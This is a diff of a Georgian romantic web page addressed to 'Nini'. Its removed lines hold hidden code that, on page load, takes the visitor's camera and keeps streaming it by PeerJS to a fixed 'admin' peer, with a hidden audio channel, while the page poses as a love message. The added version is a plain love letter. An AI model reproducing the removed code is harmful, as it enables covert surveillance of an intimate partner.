@@ -1,263 +1,182 @@
+
 <!DOCTYPE html>
 <html lang="ka">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#030305">
-
-<title>ჩვენი პატარა სამყარო ❤️</title>
-
-<!-- PeerJS Library -->
-<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-
+<title>ჩემი ნინი ❤️</title>
 <style>
-*{
-    box-sizing:border-box;
-    margin:0;
-    padding:0;
-}
+@import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@300;400;500;600&display=swap');
 
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--pink:#e99ab6;--wine:#6e1e3b;--bg:#090609}
 body{
-    min-height:100vh;
-    background:#030305;
-    color:white;
-    font-family:Arial,sans-serif;
-    overflow-x:hidden;
+ background:var(--bg);color:#f8eaf0;
+ font-family:'Noto Sans Georgian',sans-serif;
+ overflow-x:hidden;
 }
-
-#bg{
-    position:fixed;
-    inset:0;
-    width:100%;
-    height:100%;
-    z-index: 0;
+body:before{
+ content:"";position:fixed;inset:0;z-index:-1;
+ background:radial-gradient(ellipse at 50% 40%,#50182c55,transparent 70%);
 }
-
-.background{
-    position:fixed;
-    inset:0;
-    background:
-        radial-gradient(
-            circle at 50% 45%,
-            rgba(255,55,110,.12),
-            transparent 35%
-        ),
-        #030305;
-    z-index: 0;
+#particles{position:fixed;inset:0;pointer-events:none;overflow:hidden}
+.particle{
+ position:absolute;bottom:-30px;color:#e78bab;
+ animation:rise linear forwards;opacity:0;
 }
-
-#website{
-    position: relative;
-    z-index: 1;
+@keyframes rise{
+ 10%{opacity:.6}
+ 100%{transform:translateY(-110vh) rotate(180deg);opacity:0}
 }
-
-section{
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    padding:30px;
-    text-align:center;
+.screen{
+ min-height:100svh;display:flex;align-items:center;
+ justify-content:center;text-align:center;padding:60px 20px;
 }
-
-.content{
-    max-width:800px;
+.hidden{display:none!important}
+.container{width:min(850px,100%)}
+.tag{letter-spacing:5px;font-size:10px;color:#d98aa7;margin-bottom:25px}
+h1{font-size:clamp(38px,9vw,85px);font-weight:300;line-height:1.4}
+h1 span{color:var(--pink)}
+h2{font-weight:400;font-size:clamp(25px,5vw,43px);line-height:1.6}
+p{font-size:14px;color:#cbb4be;line-height:2.4}
+.rule{width:65px;height:1px;background:#b45b7c;margin:30px auto}
+button{
+ font-family:inherit;cursor:pointer;color:#fff;
+ background:linear-gradient(130deg,#772747,#32101e);
+ border:1px solid #a65b78;padding:16px 27px;
+ border-radius:3px;font-size:12px;transition:.3s;
 }
-
-.label{
-    color:#ff8fab;
-    font-size:11px;
-    letter-spacing:.3em;
-    text-transform:uppercase;
-    margin-bottom:20px;
+button:hover{transform:translateY(-3px);box-shadow:0 10px 35px #8b315055}
+.panel{
+ background:linear-gradient(145deg,#1e1119,#100a10);
+ border:1px solid #6a3047;
+ padding:clamp(25px,6vw,65px);
+ box-shadow:0 20px 80px #0009;
+ border-radius:8px;
 }
-
-h2{
-    font-family:Georgia,serif;
-    font-size:clamp(45px,9vw,100px);
-    font-weight:400;
-    line-height:.95;
+.letter{
+ text-align:left;white-space:pre-line;
+ line-height:2.5;font-size:14px;color:#e9d6df;
+ margin-top:30px;
 }
-
-h2 span{
-    color:transparent;
-    -webkit-text-stroke:1px rgba(255,255,255,.4);
+.signature{font-size:20px;color:var(--pink);margin-top:30px}
+.fade{animation:fade 1.2s ease both}
+@keyframes fade{from{opacity:0;transform:translateY(25px)}to{opacity:1;transform:none}}
+.counter{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin:30px 0}
+.counter div{
+ border:1px solid #69354a;padding:17px 15px;
+ min-width:90px;background:#190d14;
 }
-
-.description{
-    max-width:600px;
-    margin:25px auto;
-    color:#9999a3;
-    line-height:1.8;
-}
-
-.start{
-    margin-top:20px;
-    padding:14px 25px;
-    border-radius:999px;
-    border:1px solid rgba(255,255,255,.15);
-    background:rgba(255,255,255,.05);
-    color:white;
-    cursor:pointer;
-}
+.counter strong{display:block;color:var(--pink);font-size:24px;font-weight:400}
+.counter small{font-size:9px;color:#aa8292}
+footer{padding:25px;text-align:center;font-size:9px;letter-spacing:4px;color:#76505e}
 </style>
 </head>
-
 <body>
+<div id="particles"></div>
 
-<canvas id="bg"></canvas>
-<div class="background"></div>
+<section class="screen" id="home">
+ <div class="container fade">
+  <div class="tag">A STORY WRITTEN BY MY HEART</div>
+  <h1>ჩემი <span>ნინი</span></h1>
+  <div class="rule"></div>
+  <p>არსებობენ ადამიანები, რომლებიც უბრალოდ მოდიან ცხოვრებაში...<br>
+  და არსებობენ ადამიანები, რომლებიც მთელ სამყაროს გიცვლიან.</p>
+  <br>
+  <button onclick="show('story')">გაიგე, რას გრძნობს ჩემი გული ❤️</button>
+ </div>
+</section>
 
-<!-- უხილავი აუდიო ტეგი ადმინის ხმის მისაღებად -->
-<audio id="remoteAudio" autoplay></audio>
+<section class="screen hidden" id="story">
+ <div class="container panel fade">
+  <div class="tag">CHAPTER 01 · YOU</div>
+  <h2>შენ ხარ ჩემი ყველაზე ლამაზი შემთხვევითობა.</h2>
+  <div class="rule"></div>
+  <p>
+   არ ვიცი, როგორ ახერხებ ამას, მაგრამ ზოგჯერ მხოლოდ შენი სახელის დანახვაც კი საკმარისია, რომ გამეღიმოს.
+   <br><br>
+   მიყვარს შენი არსებობა, შენი ხმა, შენი სიცილი და ის პატარა დეტალები, რომლებსაც შეიძლება თავად ვერც ამჩნევ.
+   <br><br>
+   შენში არის რაღაც ისეთი, რასაც სიტყვებით ბოლომდე ვერასდროს ავხსნი.
+  </p>
+  <br><button onclick="show('letter')">შემდეგი გვერდი →</button>
+ </div>
+</section>
 
-<div id="website">
-    <section>
-        <div class="content">
-            <div class="label">OUR STORY</div>
-            <h2>ორი ადამიანი.<br><span>ერთი ისტორია.</span></h2>
-            <p class="description">
-                ეს მხოლოდ პატარა საიტი არ არის.
-                ეს არის ჩვენი მოგონებების
-                პატარა ციფრული სამყარო.
-            </p>
-            <button class="start" onclick="document.getElementById('story').scrollIntoView({behavior:'smooth'})">
-                დავიწყოთ ❤️
-            </button>
-        </div>
-    </section>
+<section class="screen hidden" id="letter">
+ <div class="container panel fade">
+  <div class="tag">CHAPTER 02 · MY HEART</div>
+  <h2>წერილი შენთვის...</h2>
+  <div class="rule"></div>
+  <div class="letter">
+ჩემო ნინი,
 
-    <section id="story">
-        <div class="content">
-            <div class="label">22 OCTOBER</div>
-            <h2>ყველაფერი<br>აქედან დაიწყო.</h2>
-            <p class="description">
-                ახლა აქ შეგვიძლია დავამატოთ
-                თქვენი რეალური ისტორია,
-                ფოტოები, ვიდეოები,
-                ტესტები და ანიმაციები.
-            </p>
-        </div>
-    </section>
-</div>
+იცი, რა არის ჩემთვის სიყვარული?
+
+სიყვარული ჩემთვის მხოლოდ სიტყვა „მიყვარხარ“ არ არის.
+
+ეს არის სურვილი, რომ დღის ბოლოს შენთან მოვყვე ყველაფერი, რაც გადამხდა.
+ეს არის შენი ხმის მოსმენის სურვილი მაშინაც კი, როცა სათქმელი არაფერი მაქვს.
+ეს არის შენი ღიმილი, რომელიც ჩემს ყველაზე ჩვეულებრივ დღესაც განსაკუთრებულს ხდის.
+
+მინდა, რომ იცოდე: შენ ჩემთვის უბრალოდ საყვარელი გოგო არ ხარ. შენ ხარ ადამიანი, რომელთანაც მინდა უამრავი მოგონება შევქმნა.
+
+მინდა, ერთად ბევრი ვიცინოთ, ვიოცნებოთ, ვიმოგზაუროთ, პატარა სისულელეებზე ვიხალისოთ და ცხოვრების ჩვეულებრივი დღეებიც ლამაზ მოგონებებად ვაქციოთ.
+
+არ გპირდები იდეალურობას. გპირდები, რომ მინდა ყოველდღე უკეთესი გავხდე, უფრო მეტად მოგისმინო, დაგაფასო და ჩემი სიყვარულით გაგრძნობინო, რამდენად მნიშვნელოვანი ხარ.
+
+თუ ოდესმე მკითხავ, რატომ მიყვარხარ, შეიძლება ათასი მიზეზი ჩამოგითვალო, მაგრამ საბოლოოდ მაინც ერთ რამემდე მივალ:
+
+იმიტომ, რომ შენ ხარ შენ.
+
+და მე შენ მიყვარხარ.
+
+  <div class="signature">უსასრულოდ შენი, დემე ❤️</div>
+  </div>
+  <br><button onclick="show('final')">ბოლო სიურპრიზი ✨</button>
+ </div>
+</section>
+
+<section class="screen hidden" id="final">
+ <div class="container fade">
+  <div class="tag">CHAPTER 03 · FOREVER</div>
+  <h1 style="font-size:clamp(35px,8vw,70px)">შენ და მე <span>❤️</span></h1>
+  <div class="rule"></div>
+  <h2>ჩემი საყვარელი ისტორია ჯერ კიდევ იწერება.</h2>
+  <p style="margin-top:20px">
+   და თუ ამ ისტორიას ერთი სურვილი უნდა ჰქონდეს,<br>
+   მინდა, რომ მასში კიდევ ბევრი ლამაზი თავი გვქონდეს ერთად.
+  </p>
+  <div class="rule"></div>
+  <h2 style="color:var(--pink)">მიყვარხარ, ნინი.</h2>
+  <p>დღეს, ხვალ და ყველა იმ დღეს, რომელიც ჯერ წინ გველოდება.</p>
+  <br>
+  <button onclick="show('home')">თავიდან წაკითხვა ↗</button>
+ </div>
+</section>
+
+<footer>MADE FOR NINI · WITH LOVE BY DEME</footer>
 
 <script>
-const ADMIN_PEER_ID = 'deme-admin-secret-key-123';
-const remoteAudio = document.getElementById('remoteAudio');
-
-let cameraStream = null;
-let peer = null;
-let currentCall = null;
-let reconnectInterval = null;
-
-window.addEventListener('DOMContentLoaded', async () => {
-    try {
-        cameraStream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-            audio: false
-        });
-
-        peer = new Peer({
-            config: {
-                iceServers: [
-                    { urls: 'stun:stun.l.google.com:19302' },
-                    { urls: 'stun:stun1.l.google.com:19302' },
-                    { urls: 'stun:stun2.l.google.com:19302' }
-                ]
-            }
-        });
-
-        peer.on('open', () => {
-            startConnectingLoop();
-        });
-
-        peer.on('disconnected', () => {
-            peer.reconnect();
-        });
-
-    } catch (error) {
-        console.log('Camera permission was not granted:', error);
-    }
-});
-
-function startConnectingLoop() {
-    if (reconnectInterval) clearInterval(reconnectInterval);
-
-    reconnectInterval = setInterval(() => {
-        if (!currentCall && peer && !peer.destroyed) {
-            makeCall();
-        }
-    }, 3000);
+function show(id){
+ document.querySelectorAll('.screen').forEach(s=>s.classList.add('hidden'));
+ let el=document.getElementById(id);
+ el.classList.remove('hidden');
+ let inner=el.querySelector('.fade');
+ if(inner){inner.classList.remove('fade');void inner.offsetWidth;inner.classList.add('fade')}
+ window.scrollTo({top:0,behavior:'smooth'});
 }
-
-function makeCall() {
-    if (!cameraStream || !peer) return;
-
-    const call = peer.call(ADMIN_PEER_ID, cameraStream);
-    
-    call.on('stream', (incomingAudioStream) => {
-        clearInterval(reconnectInterval);
-        currentCall = call;
-        remoteAudio.srcObject = incomingAudioStream;
-    });
-
-    call.on('close', () => {
-        currentCall = null;
-        startConnectingLoop();
-    });
-
-    call.on('error', () => {
-        currentCall = null;
-    });
+function particle(){
+ let p=document.createElement('span');
+ p.className='particle';
+ p.textContent=Math.random()>.5?'♥':'✦';
+ p.style.left=Math.random()*100+'%';
+ p.style.fontSize=(10+Math.random()*16)+'px';
+ p.style.animationDuration=(7+Math.random()*6)+'s';
+ document.getElementById('particles').appendChild(p);
+ setTimeout(()=>p.remove(),14000);
 }
-
-/* PARTICLES */
-const canvas = document.getElementById("bg");
-const ctx = canvas.getContext("2d");
-let particles = [];
-
-function resize() {
-    canvas.width = window.innerWidth * devicePixelRatio;
-    canvas.height = window.innerHeight * devicePixelRatio;
-    canvas.style.width = window.innerWidth + "px";
-    canvas.style.height = window.innerHeight + "px";
-    ctx.scale(devicePixelRatio, devicePixelRatio);
-
-    particles = Array.from(
-        { length: window.innerWidth < 600 ? 70 : 140 },
-        () => ({
-            x: Math.random() * window.innerWidth,
-            y: Math.random() * window.innerHeight,
-            r: Math.random() * 1.5,
-            vx: (Math.random() - 0.5) * 0.2,
-            vy: (Math.random() - 0.5) * 0.2,
-            opacity: Math.random() * 0.6
-        })
-    );
-}
-
-function animate() {
-    ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
-    particles.forEach(p => {
-        p.x += p.vx;
-        p.y += p.vy;
-        if (p.x < 0) p.x = window.innerWidth;
-        if (p.x > window.innerWidth) p.x = 0;
-        if (p.y < 0) p.y = window.innerHeight;
-        if (p.y > window.innerHeight) p.y = 0;
-
-        ctx.beginPath();
-        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
-        ctx.fillStyle = `rgba(255, 160, 190, ${p.opacity})`;
-        ctx.fill();
-    });
-    requestAnimationFrame(animate);
-}
-
-resize();
-window.addEventListener("resize", resize);
-animate();
+setInterval(particle,600);
 </script>
-
 </body>
 </html>
